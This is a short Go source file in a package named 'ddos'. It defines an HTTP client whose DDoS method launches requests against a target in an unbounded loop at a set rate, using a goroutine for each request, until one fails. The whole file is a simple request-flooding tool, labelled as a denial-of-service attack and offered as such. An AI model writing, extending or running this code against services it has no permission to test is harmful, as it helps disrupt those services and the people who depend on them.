package ddos

import (
	"fmt"
	"log"
	"net/http"
	"time"
)

type Client struct {
	HTTPClient *http.Client
}

func NewClient(timeout time.Duration) (*Client, error) {
	var c Client

	c.HTTPClient = &http.Client{
		Timeout: timeout,
	}

	return &c, nil
}

func (c *Client) DDoS(req *http.Request, rate int) error {
	pingErrc := make(chan error, 1)
	delay := time.Second / time.Duration(rate)
	for {
		select {
		case err := <-pingErrc:
			return err
		default:
			go c.ping(pingErrc, req)
			time.Sleep(delay)
		}
	}
}

func (c *Client) ping(errc chan<- error, req *http.Request) {
	res, err := c.HTTPClient.Do(req)
	if err != nil {
		errc <- fmt.Errorf("error sending request: %v", err)
		return
	}
	if res.StatusCode >= 400 {
		errc <- fmt.Errorf("received error status code: %v", res.StatusCode)
		return
	}

	log.Print("Successful PING")
}
